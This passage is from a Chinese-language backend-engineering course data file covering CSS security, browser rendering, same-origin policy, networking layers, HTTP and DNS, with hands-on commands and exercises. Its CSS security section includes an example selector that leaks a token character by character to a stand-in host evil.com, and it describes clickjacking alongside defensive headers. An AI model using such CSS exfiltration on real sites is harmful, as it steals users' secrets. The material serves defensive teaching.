      { title: 'CSS 在安全问题中扮演的角色（95% 后端不知道）', content: 'CSS 不仅是美化工具，还可能是攻击向量：\n\n1) CSS Injection：攻击者在页面中注入 <style> 标签，修改关键元素的外观。例如把"删除"按钮伪装成"保存"按钮的颜色和文字。本质上是前端层面的钓鱼攻击。\n\n2) CSS 数据窃取：利用 CSS 选择器的属性选择器 + background-url 可以把页面中的隐藏数据外传。例如：\n   input[value^="a"] { background: url("https://evil.com/steal?a") }\n   当输入框值以 "a" 开头时，浏览器会发起背景图请求，攻击者能逐个字符猜出 token。\n\n3) 点击劫持（Clickjacking）：用透明 iframe + CSS 定位诱导用户点击隐藏的按钮。\n\n后端防护：设置 Content-Security-Policy 头限制内联样式；X-Frame-Options 防止页面被嵌入 iframe。' },
      { title: '调试 CSS 的实操技巧（这对后端联调很有用）', content: '后端联调时常见的场景：前端说"样式不对"，但你看不懂 CSS 代码。两个救命技巧：\n\n1) DevTools 实时修改：F12 → Elements → 选中元素 → 右侧 Styles 面板。双击属性值可以修改（如把 color: red 改成 color: blue），页面立即生效。勾选/取消勾选可以开关样式。\n\n2) 计算值（Computed）面板：看一个元素的最终计算样式——把所有 CSS 规则叠加后的结果。这里的值就是浏览器实际用来渲染的值。当你怀疑"一个属性设置了但没生效"时，来看这里。\n\n记住：CSS 所有效果在浏览器端都可以修改——千万不要用 CSS 来"隐藏"敏感信息（如用 display:none 隐藏管理员菜单），因为用户一秒就能改回来。权限控制必须在后端。' },
    ],
    diagnosis: [
      { symptom: '前端页面样式错乱，后端返回的 HTML 页面布局完全崩了', cause: 'CSS 文件加载失败——Nginx 静态文件路径配置错误，或构建时 CSS 引用路径不对。', fix: '1) 浏览器 Network 面板确认 CSS 请求的 HTTP 状态码 2) 检查 Nginx location 块是否匹配静态资源路径 3) 确认构建产物的 CSS 引用使用正确的路径。' },
      { symptom: '管理后台页面在 Chrome 正常但在 Firefox 显示异常', cause: '某些 CSS 属性有浏览器兼容性差异，或使用了实验性 CSS 特性。', fix: '1) 确认 CSS 使用了 autoprefixer 自动加前缀 2) caniuse.com 检查有问题的 CSS 属性的浏览器支持 3) 后端配合设置合理的 Cache-Control 确保新 CSS 及时生效。' },
    ],
    exercises: [
      { level: '基础', task: '打开任意网站，用 DevTools 把首页的主标题颜色改成红色，把导航栏隐藏掉', hint: 'F12 → Elements → 点左上角箭头 → 点击页面元素 → Styles 面板修改', answer: '选中标题元素 → Styles 面板找到 color 属性 → 改成 red。选中导航栏 → 添加 display: none。按 Esc 键可以在 Elements 面板下方打开 Console，输入 document.querySelector("nav").style.display = "none" 同样效果。' },
      { level: '进阶', task: '访问一个有表单的网站，用 DevTools 修改 CSS 把一个 type="submit" 的按钮的样式伪装成普通文本，说明这有什么安全风险', hint: '修改 background/border/color/cursor 等属性', answer: '把按钮的 background: none; border: none; color: blue; cursor: pointer; text-decoration: underline 改成链接样式 → 用户可能误以为只是普通链接而点击。这说明前端的一切都可以被修改——安全控制必须后端做（如转账操作需要二次验证而非靠按钮外观）。' },
    ],
  },

  // ============================================================
  // 7. Browsers / 浏览器如何工作
  // ============================================================
  "P82WFaTPgQEPNp5IIuZ1Y": {
    mentalModel: '浏览器是一个"翻译官+保安"——它把 HTML、CSS、JS 三种语言翻译成你眼中看到的页面，同时用同源策略（Same-Origin Policy）等规则像保安一样保护你的数据不被恶意网站窃取。后端工程师理解浏览器，就像物流公司理解"用户家门口的环境"。',
    sections: [
      { title: '浏览器渲染流程——从 URL 到像素', content: '完整的渲染流水线（Critical Rendering Path）：\n\n1) 解析 HTML → DOM 树（Document Object Model，文档的树状结构表示）\n2) 解析 CSS → CSSOM 树（CSS Object Model，样式规则的树状结构）\n3) 合并 DOM + CSSOM → Render 树（只包含需要显示的元素，display:none 的不在树里）\n4) Layout（布局/回流）：计算每个元素在屏幕上的确切位置和大小\n5) Paint（绘制）：把像素画到屏幕上\n6) Composite（合成）：把不同图层合并成最终画面\n\n关键认知：JavaScript 会在第 1-4 步之间执行并可能阻塞渲染。\n- 遇到 <script> 标签 → 暂停 HTML 解析 → 下载 + 执行 JS → 继续解析\n- 如果 JS 修改了 DOM 或 CSSOM → 可能触发 Reflow（重新布局，代价高）或 Repaint（重新绘制）\n- async 属性：下载 JS 时不阻塞解析，下载完立即执行\n- defer 属性：下载 JS 时不阻塞解析，等 HTML 解析完再按顺序执行' },
      { title: '同源策略（Same-Origin Policy）——浏览器最重要的安全机制', content: '同源策略规定：一个"源"的 JavaScript 不能读取另一个"源"的数据。\n\n"源"的定义：协议 + 域名 + 端口，三者完全相同才算同源。\n- https://a.com 和 http://a.com → 不同源（协议不同）\n- https://a.com 和 https://b.a.com → 不同源（域名不同，子域也算不同）\n- https://a.com:443 和 https://a.com:8443 → 不同源（端口不同）\n\n同源策略的限制范围：\n- XMLHttpRequest/fetch（不能读响应）——但请求可以发出！\n- DOM 访问（不能操作另一个源的 iframe 内容）\n- Cookie/LocalStorage/IndexedDB（每个源独立）\n\n同源策略不限制的内容：\n- <script>/<img>/<link>/<video> 标签的跨域加载（所以 CDN 加载 JS 不受影响）\n- 表单提交（你可以 POST 数据到另一个源，只是读不到响应）\n- 重定向\n\n这解释了为什么 CORS 是"放宽同源策略"而非"创建新规则"：后端通过 Access-Control-Allow-Origin 响应头告诉浏览器"我允许这个源读我的数据"。' },
      { title: '浏览器行为对后端设计的影响', content: '1) Cookie 自动携带：浏览器每次请求自动带上该域名下的 Cookie。利用这个特性实现 Session 认证。但也带来 CSRF 风险——恶意网站可以通过 <img> 标签触发对目标网站的请求，浏览器自动带上 Cookie。SameSite Cookie 属性（Strict/Lax/None）是后端防御 CSRF 的第一道防线。\n\n2) 预检请求（Preflight / OPTIONS）：浏览器在发送某些跨域请求前先发 OPTIONS 请求询问服务器是否允许。触发条件：非简单请求（Content-Type 非表单格式、使用自定义 Header 等）。后端必须正确响应 OPTIONS 请求，否则浏览器会拦截实际请求。\n\n3) 缓存行为差异：浏览器对不同请求类型的缓存策略不同——XHR 请求不缓存（需显式设置 Cache-Control），但 <img>/<script> 等资源默认缓存。后退/前进时会使用 BFCache（内存中的整页快照），恢复时不重新发请求。' },
    ],
    handsOn: [
      { title: '体验同源策略的限制', cmd: `# 在任意网站的 Console 中执行：
# 这个会成功（同源，或允许 CORS）
fetch('https://api.github.com/users/octocat')
  .then(r => r.json())
  .then(d => console.log(d.login))

# 这个会失败（跨域且不允许 CORS）
fetch('https://www.baidu.com')
  .then(r => r.text())
  .catch(e => console.log('跨域错误:', e.message))`, output: '跨域错误: Failed to fetch\n或 \nAccess to fetch at \'https://www.baidu.com\' has been blocked by CORS policy', explain: 'GitHub API 设置了 Access-Control-Allow-Origin: *，允许任何来源访问。百度首页没有设置 CORS 头，浏览器拦截了读取响应的操作——注意：请求实际已经发到了百度服务器并返回了数据，只是浏览器不让 JS 读取。' },
    ],
    diagnosis: [
      { symptom: '前端请求 API 报 CORS 错误 "No Access-Control-Allow-Origin header"', cause: '后端没有设置 CORS 响应头，或设置的 origin 不匹配前端页面的 origin。注意：端口不同也算跨域（localhost:3000 → localhost:8080）。', fix: '1) 后端添加 Access-Control-Allow-Origin 头（开发环境设 *，生产环境设具体域名）2) 如果用了自定义 Header，还得设 Access-Control-Allow-Headers 3) 如果前端发 OPTIONS 预检失败了，检查后端是否处理了 OPTIONS 请求。' },
      { symptom: '用户在 HTTPS 页面中看到某些图片/请求被浏览器拦截了', cause: 'HTTPS 页面中加载了 HTTP 资源（混合内容 Mixed Content）。浏览器会拦截"主动混合内容"（JS/CSS/字体），对"被动混合内容"（图片/视频/音频）会显示警告。', fix: '1) 所有资源统一用 HTTPS（协议相对 URL：//cdn.example.com/img.png 自动匹配当前协议）2) 后端返回 Content-Security-Policy: upgrade-insecure-requests 头，浏览器自动升级 HTTP 为 HTTPS。' },
      { symptom: '用户登录后，某些浏览器（Safari/Firefox）Cookie 带不上', cause: 'Safari 的 "Intelligent Tracking Prevention"（ITP）和 Firefox 的 "Enhanced Tracking Protection"（ETP）严格限制了第三方 Cookie 和某些第一方 Cookie 行为。', fix: '1) 明确设置 SameSite=Lax + Secure（生产环境必须 HTTPS 才能设 Secure）2) 避免在 iframe 中依赖 Cookie 3) 考虑用 Token（JWT 存 LocalStorage 或内存）替代 Session Cookie。' },
    ],
    exercises: [
      { level: '基础', task: '打开浏览器 DevTools Console，执行 fetch(\'https://api.github.com\').then(r=>r.json()).then(console.log)，观察返回了哪些信息。然后尝试访问另一个没有 CORS 头的网站，观察报错', hint: 'GitHub API 允许跨域，百度/淘宝等网站不允许跨域', answer: 'GitHub API 返回 JSON 数据，说明服务器设置了 Access-Control-Allow-Origin。换成 fetch("https://www.baidu.com") 会在 Console 看到 CORS 报错——请求实际上成功发出了，但浏览器禁止 JS 读取响应。' },
      { level: '进阶', task: '用 Chrome DevTools 的 Performance 面板录制一次页面加载，找出 HTML 解析、CSS 解析、JS 执行分别花了多少时间', hint: 'F12 → Performance → 点录制（圆点）→ 输入 URL 回车 → 加载完点停止 → 分析时间线', answer: '时间线上蓝色 = HTML 解析，紫色 = 样式计算+布局，黄色 = JS 执行。通常 JS 执行和 Layout 是最耗时的环节。观察 <script> 标签是否阻塞了解析（蓝色段出现空白）。这是做性能优化的第一步。' },
      { level: '挑战', task: '搭建一个简单的跨域实验：在本地 3000 端口起一个页面，在 8080 端口起一个 JSON API，先不配 CORS 看报错，然后加上 Access-Control-Allow-Origin 头修复', hint: '用 Node.js http 模块或 Python http.server 起两个服务', answer: '页面中 fetch("http://localhost:8080/api")。后端不加 CORS 头时 Console 报跨域错误。在 8080 服务返回头中加上 Access-Control-Allow-Origin: http://localhost:3000 后跨域成功。这个实验揭示了 CORS 的完整工作原理。' },
    ],
  },

  // ============================================================
  // 8. How does the internet work? / 互联网如何工作
  // ============================================================
  "yCnn-NfSxIybUQ2iTuUGq": {
    mentalModel: '互联网是一个"全球快递系统"——每台设备有地址（IP），数据拆成包裹（Packet），路由器是分拣中心（Router），TCP 协议确保包裹不丢、不乱序、完整送达。后端工程师是这个快递系统里的"仓库管理员"——管一个仓库（服务器），接收和发出包裹（数据包）。',
    sections: [
      { title: '五层网络模型（TCP/IP 协议栈）', content: '自上而下，每层都是上一层的基础：\n\n5) 应用层 —— 你的程序直接对话的协议\n    协议：HTTP/HTTPS、DNS、SSH、SMTP、WebSocket\n    数据单元：消息（Message）\n    后端重点：这一层是你的代码最直接交互的地方\n\n4) 传输层 —— 端到端（进程到进程）的可靠/不可靠传输\n    协议：TCP（可靠、有序、面向连接）、UDP（快速、不可靠、无连接）\n    数据单元：段（Segment）\n    地址：端口号（0-65535，其中 0-1023 是系统保留端口）\n\n3) 网络层 —— 主机到主机的寻址和路由\n    协议：IP（IPv4 32位 / IPv6 128位）、ICMP（ping 用）\n    数据单元：包（Packet）\n    地址：IP 地址（如 192.168.1.1、8.8.8.8）\n\n2) 数据链路层 —— 局域网内的帧传输\n    协议：Ethernet、WiFi（802.11）\n    数据单元：帧（Frame）\n    地址：MAC 地址（如 aa:bb:cc:dd:ee:ff）\n\n1) 物理层 —— 0101 的物理信号\n    介质：光纤、双绞线、无线电波\n    这层就是"光/电信号"，不关心内容' },
      { title: '一次 HTTP 请求的网络层旅程——时间都去哪了', content: '用户访问 https://example.com/api/users 的完整时间线：\n\n1) DNS 解析（0-200ms，有缓存 <1ms）\n   浏览器 → 本地 DNS → 根域 → .com 顶级域 → example.com 权威 → 返回 IP\n\n2) TCP 三次握手（1 RTT，50-150ms）\n   SYN → SYN-ACK → ACK\n   为什么三次？防止历史重复连接（已失效的旧请求被误接受）\n\n3) TLS 握手（TLS 1.2: 2 RTT，TLS 1.3: 1 RTT）\n   密钥协商 + 证书验证\n\n4) 发送 HTTP 请求（<1ms 本地，整个请求到达服务器 = 网络延迟 + 带宽传输时间）\n\n5) 服务器处理（毫秒到秒级，取决于业务复杂度）\n\n6) 返回 HTTP 响应（网络传输时间）\n\n7) TCP 四次挥手（可以复用连接 Keep-Alive 跳过）\n\n优化思路：\n- 减少 RTT：用 CDN 靠近用户、HTTP/2 多路复用、TLS 1.3\n- 减少传输数据：gzip/brotli 压缩、缓存（304）、精简 JSON 字段\n- 减少服务器处理：数据库索引、Redis 缓存、异步处理' },
      { title: 'IP 地址、路由与 NAT——为什么你家的 IP 和网站看到的 IP 不一样', content: 'IP 地址层次：\n- 公网 IP：全球唯一，由 ISP 分配（如 123.45.67.89）\n- 私有 IP：局域网内唯一（10.x.x.x / 192.168.x.x / 172.16-31.x.x）\n- 回环地址：127.0.0.1 = localhost = "我自己"\n\n路由原理：\n数据包经多个路由器跳到目的地，每个路由器根据路由表决定"下一跳"。traceroute 可以看到完整路径。核心协议：BGP（边界网关协议）——互联网的"导航地图"。\n\nNAT（网络地址转换）：\n你家的所有设备（手机、电脑、平板）共享一个公网 IP。路由器通过 NAT 把内网 IP+端口 映射到公网 IP+端口。\n- 出门：192.168.1.5:45678 → 公网IP:50001（路由器记录映射）\n- 回来：公网IP:50001 → 192.168.1.5:45678（路由器查表转发）\n\n这对后端的影响：\n- 你本地 3000 端口起的服务，外部默认访问不到（需要端口映射/内网穿透）\n- 基于 IP 的限流器在 NAT 环境下可能误伤——同一个公网 IP 后面可能是一整个公司的人\n- X-Forwarded-For 头在反向代理/NAT 场景中传递真实客户端 IP' },
    ],
    handsOn: [
      { title: '查看一次完整的网络请求路径', cmd: 'traceroute -n google.com 2>&1 | head -20', output: ' 1  192.168.1.1   1.234 ms\n 2  10.0.0.1     5.678 ms\n 3  * * *\n 4  172.16.0.1   12.345 ms\n ...\n15  142.250.80.46  28.901 ms', explain: '每一行是一个路由跳（hop）和时间。第1跳是你家路由器（192.168.1.x），后续是运营商网络，最后是目标 IP。* * * 表示该路由器不响应 ICMP 探测包（常见于防火墙和某些运营商）。' },
      { title: '查看本机的网络配置', cmd: 'ifconfig | grep -E "inet |inet6 " | head -5', output: 'inet 127.0.0.1 netmask 0xff000000\ninet 192.168.1.5 netmask 0xffffff00 broadcast 192.168.1.255\ninet6 ::1 prefixlen 128\ninet6 fe80::1234:abcd:ef01:2345%en0 prefixlen 64', explain: '127.0.0.1 = 本机回环。192.168.1.5 = 你的局域网 IP（私有地址）。fe80::... = IPv6 链路本地地址。这是你的机器在网络中的"草根身份证"。' },
    ],
    diagnosis: [
      { symptom: 'ping 域名能通但 curl 报 "Could not resolve host"', cause: 'ping 用的是系统的 DNS 解析，curl 可能用了不同的解析方式或代理设置。常见原因：代理配置错误、curl 使用了特定 DNS 服务器。', fix: '1) 检查环境变量：echo $http_proxy $https_proxy 2) curl 加 --noproxy "*" 临时绕过代理测试 3) cat /etc/resolv.conf 看系统 DNS 配置 4) curl -v 输出中看 * Trying IP... 是否解析成功。' },
      { symptom: '服务器上部署的服务 curl localhost:8080 能通但外部访问不了', cause: '服务绑定在 127.0.0.1（只接受本地连接）而不是 0.0.0.0（所有网络接口）。或防火墙/安全组没有放行 8080 端口。', fix: '1) 服务配置里把监听地址从 127.0.0.1 改成 0.0.0.0 2) netstat -tlnp | grep 8080 查看监听情况——Local Address 应该是 0.0.0.0:8080 而非 127.0.0.1:8080 3) 检查云服务器安全组/防火墙。' },
      { symptom: '同一个 Wi-Fi 下的两台电脑互相 ping 不通', cause: 'AP 隔离（AP Isolation/Client Isolation）——路由器禁止 Wi-Fi 客户端之间直接通信（公共场所安全策略）。或防火墙拦截了 ICMP。', fix: '1) 进入路由器管理页面关闭 AP 隔离 2) 用防火墙规则允许局域网通信 3) 改用其他协议测试（如 HTTP/TCP 而非 ICMP ping）。' },
    ],
    exercises: [
      { level: '基础', task: '用 ping 测试到 baidu.com 和 google.com 的延迟差异，解释原因', hint: '网络距离 = 物理距离 + 路由跳数', answer: 'ping baidu.com 通常 20-60ms（服务器在国内），ping google.com 可能 150-300ms（服务器在海外）。跨洋光纤的物理延迟下限 >100ms。CDN 通过把内容缓存到离用户近的边缘节点来对抗这个延迟。' },
      { level: '进阶', task: '用 traceroute 查看访问 github.com 的路径，数一数经过了多少跳，哪一跳延迟变化最大', hint: 'traceroute github.com（Mac/Linux）或 tracert github.com（Windows）', answer: '通常 10-20 跳，延迟突然增大的那一跳是"出国口"——从国内网络切到国际链路。这也是 VPN 的价值所在：优化这个瓶颈。观察最后几跳如果显示 GitHub 的 IP 段（140.82.x.x），说明已经到了目标网络。' },
    ],
  },

  // ============================================================
  // 9. What is HTTP? / HTTP 是什么
  // ============================================================
  "R12sArWVpbIs_PHxBqVaR": {
    mentalModel: 'HTTP 是客户端和服务器之间的"对话协议"——客户端说"我要这个"（Request），服务器说"给你"或"没有"或"你没权限"（Response）。就像你去便利店买东西：你要一瓶水（GET /water），老板说"2块"（200 OK + 水），或者说"卖完了"（404）。所有的 Web 通信都建立在这个简单的问答模型之上。',
    sections: [
      { title: 'HTTP 请求的完整解剖', content: '一个 HTTP 请求由四部分组成：\n\n第一部分：请求行（Request Line）\n格式：METHOD /path HTTP/VERSION\n例如：POST /api/users HTTP/1.1\n\n常用方法：\n- GET：获取资源（只读，不改变服务器状态）\n- POST：创建资源（非幂等——发两次创建两个）\n- PUT：全量更新/替换资源（幂等——发多次结果一样）\n- PATCH：部分更新资源\n- DELETE：删除资源\n- HEAD：和 GET 一样但只返回头（用于检查是否存在、获取大小）\n- OPTIONS：询问服务器支持哪些方法（CORS 预检用）\n\n第二部分：请求头（Request Headers）\n- Host: api.example.com（必需，HTTP/1.1+）\n- Content-Type: application/json（我发的数据是什么格式）\n- Accept: application/json（我要什么格式的返回）\n- Authorization: Bearer token123（身份验证）\n- User-Agent: Mozilla/5.0...（我是谁）\n- Cookie: sessionId=abc（携带之前服务器设置的会话）\n\n第三部分：空行（CRLF）\n必须有一个空行分隔 Header 和 Body。\n\n第四部分：请求体（Request Body）\n可选。POST/PUT/PATCH 通常有 Body。GET/DELETE/HEAD 一般没有。JSON 格式最常见。' },
      { title: 'HTTP 响应的完整解剖', content: '响应也是四部分：\n\n状态行：HTTP/1.1 200 OK\n\n状态码分类（记住有规律的）：\n- 1xx：信息（101 Switching Protocols → WebSocket 升级用）\n- 2xx：成功\n  200 OK（标准成功）\n  201 Created（创建资源成功，通常在 POST 后返回，带新资源 URL）\n  204 No Content（成功但无返回体，DELETE 常用）\n- 3xx：重定向\n  301 Moved Permanently（永久迁移，搜索引擎会更新索引）\n  302 Found（临时重定向）\n  304 Not Modified（缓存有效，用缓存的版本）\n- 4xx：客户端错误（你的问题）\n  400 Bad Request（请求格式错误，参数校验不通过）\n  401 Unauthorized（需要登录）\n  403 Forbidden（已登录但权限不够）\n  404 Not Found（资源不存在）\n  405 Method Not Allowed（GET 的路径你用 POST 请求）\n  422 Unprocessable Entity（参数格式对但语义错——如年龄填了-5）\n  429 Too Many Requests（限流了，慢一点）\n- 5xx：服务端错误（服务器的问题）\n  500 Internal Server Error（代码崩了）\n  502 Bad Gateway（代理/网关收到了上游的错误响应）\n  503 Service Unavailable（服务过载/维护中）\n  504 Gateway Timeout（网关等上游响应超时了）\n\n重要认知：4xx 和 5xx 的区别。看到 4xx 先查自己的请求（参数/URL/Header 对了吗？）。看到 5xx 去查服务器日志（代码哪行崩了？数据库挂了吗？）。' },
      { title: 'HTTP 版本演进史——从 1.1 到 3', content: 'HTTP/1.1（1997，目前最普及）：\n- 引入 Keep-Alive：一个 TCP 连接可以发多个请求（之前 1.0 每请求新建连接）\n- 管道化（Pipelining）：不等回复就发下一个请求。但有"队头阻塞"问题——第一个响应慢，后面全得等着。实践中基本不用管道化。\n- Chunked Transfer Encoding：响应分块传输，不知道总大小时也能开始传\n\nHTTP/2（2015，目前主流）：\n- 二进制分帧：不再用文本，改为二进制帧（性能大幅提升）\n- 多路复用（Multiplexing）：一个 TCP 连接上同时跑多个请求-响应流，彻底解决 HTTP/1.1 的队头阻塞\n- Server Push：服务器可以主动推送资源（如 HTML 推送 CSS/JS）——但实践中用得不好，Chrome 甚至移除了支持\n- Header 压缩（HPACK）：重复的 Header 大大压缩\n\nHTTP/3（2022，快速增长中）：\n- 基于 QUIC 协议（底层用 UDP 而非 TCP）\n- 0-RTT 握手：之前连接过的服务器可以秒连\n- 解决 TCP 层队头阻塞：TCP 丢包不阻塞其他流\n- 连接迁移：WiFi 切 4G，连接不断（因为不是基于 IP:Port 来标识连接）\n\n目前最佳实践：对外服务至少配 HTTP/2，内部服务看场景。CDN 一般都支持 HTTP/3。' },
    ],
    handsOn: [
      { title: '逐行解读一次完整的 HTTP 请求-响应', cmd: `curl -v -X POST https://httpbin.org/post \\
  -H "Content-Type: application/json" \\
  -H "X-Custom-Header: hello-backend" \\
  -d '{"name":"liqun","topic":"http"}' 2>&1`, output: '> POST /post HTTP/2\n> Host: httpbin.org\n> Content-Type: application/json\n> X-Custom-Header: hello-backend\n>\n> {"name":"liqun","topic":"http"}\n>\n< HTTP/2 200\n< content-type: application/json\n<\n{ "json": { "name": "liqun", "topic": "http" }, "headers": { "X-Custom-Header": "hello-backend" } }', explain: '仔细看每一行：> 开头的是客户端发的（Request），< 开头的是服务器回的（Response）。httpbin 回显了你发的 JSON 和自定义 Header——这在调试时非常有用。' },
      { title: '测试不同的状态码', cmd: `for code in 200 201 301 404 500; do
  echo -n "HTTP $code: "
  curl -s -o /dev/null -w "%{http_code}" "https://httpbin.org/status/$code"
  echo ""
done`, output: 'HTTP 200: 200\nHTTP 201: 201\nHTTP 301: 301\nHTTP 404: 404\nHTTP 500: 500', explain: 'httpbin.org/status/XXX 直接返回指定的状态码，非常适合测试你的错误处理代码。在实际项目中你要确保每种状态码都有对应的处理逻辑。' },
    ],
    diagnosis: [
      { symptom: '客户端收到 502 Bad Gateway，后端日志显示正常', cause: '502 不是你后端应用返回的，而是前面的代理/网关（Nginx/AWS ALB）在转发请求时无法连接到后端或收到了无效响应。常见原因：后端服务挂掉了、端口改了、超时设置太短。', fix: '1) 先确认后端服务是否在运行：ps aux | grep 你的应用 2) 检查代理配置文件中的后端地址和端口是否正确 3) 增加代理超时时间（如 Nginx proxy_read_timeout）4) 检查防火墙/安全组是否放开端口。' },
      { symptom: 'POST 请求后端收不到 Body 数据（req.body 为空对象）', cause: 'Content-Type 设置错误（发了 JSON 但声明是 text/plain），或后端 body parser 中间件没有正确配置。', fix: '1) 客户端确保设置 Content-Type: application/json 2) 后端检查 body parser 中间件：Express 用 express.json()，Go 用 json.NewDecoder(r.Body).Decode(&v) 3) curl 测试时用 -H "Content-Type: application/json" -d \'{"key":"val"}\'。' },
      { symptom: '请求返回 429 Too Many Requests', cause: '触发了服务端的限流（Rate Limiting）策略。通常是某个 IP 在短时间内发了太多请求。', fix: '1) 查看响应头中的 RateLimit 相关字段（如 X-RateLimit-Remaining 剩余次数、Retry-After 重试等待秒数）2) 客户端实现指数退避重试：第一次等 1 秒，第二次等 2 秒，第三次等 4 秒... 3) 如果是你的 API 被限流了，联系 API 提供方提升配额。' },
    ],
    exercises: [
      { level: '基础', task: '用 curl -X 分别发送 GET/POST/PUT/DELETE 四种请求到 https://httpbin.org/anything，观察返回中 method 字段的变化', hint: 'curl -X METHOD https://httpbin.org/anything', answer: 'httpbin 会在响应 JSON 的 "method" 字段回显你的请求方法。GET 返回 "method":"GET"，POST 返回 "method":"POST"。注意 curl 默认是 GET，POST 需要 -d 带数据。' },
      { level: '进阶', task: '用 netcat (nc) 手工构造一个 HTTP/1.1 请求，直接发送到服务器', hint: 'nc httpbin.org 80 然后输入 GET /get HTTP/1.1\\nHost: httpbin.org\\n\\n', answer: 'echo -e "GET /get HTTP/1.1\\r\\nHost: httpbin.org\\r\\nConnection: close\\r\\n\\r\\n" | nc httpbin.org 80。这让你看到 HTTP 协议的原始文本形态——就是简单的几行字加空行。理解了这一点，HTTP 对你就不再神秘。' },
      { level: '挑战', task: '实现一个简单的 HTTP 请求分析工具：输入 URL，输出 DNS 解析时间、TCP 连接时间、TLS 握手时间、TTFB、总耗时、响应大小（用压缩和不压缩对比）', hint: 'curl -w 模板 + gzip 头', answer: 'curl -s -o /dev/null -w "DNS:%{time_namelookup}s TCP:%{time_connect}s TLS:%{time_appconnect}s TTFB:%{time_starttransfer}s Total:%{time_total}s Size:%{size_download}" URL。加 -H "Accept-Encoding: gzip" 和不加这个 Header 对比 Size 差异，理解压缩的价值。' },
    ],
  },

  // ============================================================
  // 10. What is Domain Name? / 域名是什么
  // ============================================================
  "ZhSuu2VArnzPDp6dPQQSC": {
    mentalModel: '域名是互联网的"通讯录"——你记不住 142.250.80.46（Google 的 IP）但能记住 google.com。DNS 就是这个通讯录的查询服务，域名注册局是"通讯录出版社"。域名是后端工程师最常打交道的基础设施之一——买域名、配 DNS、绑定服务器。',
    sections: [
      { title: '域名的层级结构——从右往左读', content: '以 https://www.blog.example.com 为例：\n\n1) 根域（Root Domain）：最右侧那个看不见的点 "."\n   全球 13 组根域名服务器（a.root-servers.net ~ m.root-servers.net）\n   这是 DNS 查询的起点\n\n2) 顶级域（TLD - Top Level Domain）：.com\n   通用顶级域（gTLD）：.com（商业）、.org（组织）、.net（网络）、.io（科技）、.dev（开发）\n   国家顶级域（ccTLD）：.cn（中国）、.uk（英国）、.jp（日本）、.de（德国）\n   新通用顶级域：.app、.blog、.shop、.xyz 等（2012 年后陆续开放）\n\n3) 二级域（SLD）：example\n   这是你在注册商（Namecheap/阿里云/GoDaddy）购买的部分\n   二级域是域名的"身份核心"——你拥有它并可以创建子域\n\n4) 三级域（子域）：blog\n   二级域的拥有者可以任意创建子域，不需要额外付费\n   常见子域：www（网站）、api（API 服务）、cdn（静态资源）、mail（邮件）、admin（管理后台）\n\n完整域名（FQDN）：www.blog.example.com.（注意末尾的点代表根域，实际使用中通常省略）' },
      { title: '从买域名到网站上线——后端视角的完整流程', content: '假设你买了一台云服务器（IP 为 1.2.3.4），买了域名 mycoolapp.com。\n\n步骤 1：在注册商处配置 DNS\n进入 DNS 管理面板（通常在域名注册商的控制台），添加记录：\n- A 记录：mycoolapp.com → 1.2.3.4（主域名指向服务器 IP）\n- CNAME 记录：www.mycoolapp.com → mycoolapp.com（www 子域指向主域）\n- 可选：A 记录：api.mycoolapp.com → 1.2.3.4（API 子域也指向同一服务器，后面用 Nginx 区分）\n\n步骤 2：等待 DNS 传播\nDNS 修改后不是立刻全球生效的——取决于各记录的 TTL（Time To Live）。默认 TTL 通常是 600-3600 秒。传播时间从几分钟到 48 小时不等。\n\n步骤 3：配置服务器\n在服务器上用 Nginx/Caddy 配置虚拟主机，根据域名区分服务：\nserver { server_name mycoolapp.com; root /var/www/app; }\nserver { server_name api.mycoolapp.com; proxy_pass http://localhost:3000; }\n\n步骤 4：配 HTTPS\n用 Let\'s Encrypt（certbot）或 Caddy 自动获取免费 SSL 证书。\n\n常见坑：\n- 修改 DNS 后 ping 域名没变：本地 DNS 缓存没刷新（dscacheutil -flushcache）\n- 配了 A 记录但不生效：确认域名状态不是"clientHold"（未实名认证/过期）\n- 域名能 ping 通但网站打不开：服务器上没正确配置 Nginx 或用的是 HTTP 而非 HTTPS' },
    ],
    handsOn: [
      { title: '查看域名的完整 DNS 记录', cmd: 'dig example.com ANY +noall +answer', output: 'example.com.  3600  IN  A    93.184.216.34\nexample.com.  3600  IN  AAAA 2606:2800:220:1:248:1893:25c8:1946\nexample.com.  3600  IN  NS   a.iana-servers.net.\nexample.com.  3600  IN  SOA  sns.dns.icann.org.', explain: 'A 记录 = IPv4 地址，AAAA 记录 = IPv6 地址，NS 记录 = 权威 DNS 服务器，SOA = 管理信息。example.com 是 IANA 保留的示例域名，任何人都可以用它学习 DNS。' },
      { title: '检查域名注册信息', cmd: 'whois example.com | head -30', output: 'Domain Name: EXAMPLE.COM\nRegistry Domain ID: 2336799_DOMAIN_COM-VRSN\nRegistrar WHOIS Server: whois.iana.org\nCreation Date: 1995-08-14\nRegistry Expiry Date: 2025-08-13\nName Server: A.IANA-SERVERS.NET', explain: 'whois 显示域名的注册者、注册商、创建日期、到期日期。注意：域名的到期日期非常重要——忘了续费 = 网站没了 = 用户流失。建议开启自动续费。' },
    ],
    diagnosis: [
      { symptom: 'ping 域名显示 "cannot resolve" 或 "unknown host"', cause: '域名不存在、DNS 配置有问题、域名已过期、或本地 DNS 解析器故障。', fix: '1) dig 域名确认 DNS 是否正常（换 8.8.8.8 测试：dig @8.8.8.8 域名）2) whois 域名检查注册状态和到期日 3) 检查 DNS 提供商的控制台是否有误 4) 本地 DNS 缓存刷新：sudo dscacheutil -flushcache（Mac）。' },
      { symptom: '域名指向了新 IP 但已经 12 小时了还没生效', cause: 'TTL 设置过长（如 86400 = 24小时），某些中间 DNS 服务器还在用旧缓存。或浏览器/操作系统 DNS 缓存。', fix: '1) 用 whatsmydns.net 全球检测传播状态 2) 在修改 DNS 前临时将 TTL 降到 300（5分钟），修改生效后再恢复 3) 强制刷新本地：dscacheutil -flushcache && sudo killall -HUP mDNSResponder 4) 最坏情况等原 TTL 过期。' },
    ],
    exercises: [
      { level: '基础', task: '用 dig 查询 taobao.com 的 A 记录，注意它返回了几个 IP（负载均衡）', hint: 'dig taobao.com A +short', answer: '通常返回多个 IP 地址（2-4个），这是 DNS 级别的负载均衡。每次 DNS 查询可能返回不同的 IP 顺序（DNS Round Robin）。大网站还会结合 CDN 返回就近的 IP。' },
      { level: '进阶', task: '用 dig +trace 完整追踪一个域名的解析过程，从根域开始，画出每一级的查询路径', hint: 'dig +trace github.com', answer: '输出从根服务器开始：根域返回 .com 的 NS 记录 → .com 服务器返回 github.com 的 NS 记录 → github.com 的权威服务器返回 A 记录。这就是 DNS 的分层查询机制。' },
